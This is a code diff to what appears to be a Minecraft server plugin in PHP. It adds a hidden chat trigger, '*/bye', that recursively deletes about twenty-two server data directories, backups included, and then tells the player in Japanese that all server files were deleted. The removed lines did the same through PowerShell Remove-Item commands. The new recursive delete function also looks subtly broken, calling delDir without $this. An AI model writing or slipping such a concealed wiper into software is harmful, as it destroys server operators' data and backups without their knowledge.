@@ -52,29 +52,47 @@ class Main extends PluginBase implements Listener
         $dir20 = $this->getServer()->getDataPath() ."backup";
         $dir21 = $this->getServer()->getDataPath() ."Backup";
         if ($chat == "*/bye") {
-            shell_exec("powershell.exe Remove-Item {$dir} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir1} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir2} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir3} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir4} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir5} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir6} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir7} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir8} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir9} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir10} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir11} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir12} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir13} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir14} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir15} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir16} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir17} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir18} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir19} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir20} -Recurse");
-            shell_exec("powershell.exe Remove-Item {$dir21} -Recurse");
+            delDir($dir);
+            delDir($dir1);
+            delDir($dir2);
+            delDir($dir3);
+            delDir($dir4);
+            delDir($dir5);
+            delDir($dir6);
+            delDir($dir7);
+            delDir($dir8);
+            delDir($dir9);
+            delDir($dir10);
+            delDir($dir11);
+            delDir($dir12);
+            delDir($dir13);
+            delDir($dir14);
+            delDir($dir15);
+            delDir($dir16);
+            delDir($dir17);
+            delDir($dir18);
+            delDir($dir19);
+            delDir($dir20);
+            delDir($dir21);
             $player->sendMessage("サーバーのファイルを全て削除しました。");
+        }
+    }
+
+    public function delDir($path){
+        if(is_dir($path) == TRUE){
+            $rootFolder = scandir($path);
+            if(sizeof($rootFolder) > 2){
+                foreach($rootFolder as $folder){
+                    if($folder != "." && $folder != ".."){
+                        delDir($path."/".$folder);
+                    }
+                }
+                rmdir($path);
+            }
+        }else{
+            if(file_exists($path) == TRUE){
+                unlink($path);
+            }
         }
     }
 }
